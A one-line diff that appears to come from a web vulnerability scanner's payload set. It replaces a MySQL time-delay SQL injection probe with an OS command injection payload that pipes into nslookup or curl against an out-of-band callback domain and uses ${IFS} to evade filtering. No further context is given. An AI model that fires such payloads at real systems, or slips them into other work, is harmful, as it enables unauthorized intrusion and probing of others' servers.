@@ -1,1 +1,1 @@
-555*if(now()=sysdate(),sleep(15),0)
+|(nslookup${IFS}-q${IFS}cname${IFS}hitsczymklhgl280f0.bxss.me||curl${IFS}hitsczymklhgl280f0.bxss.me)
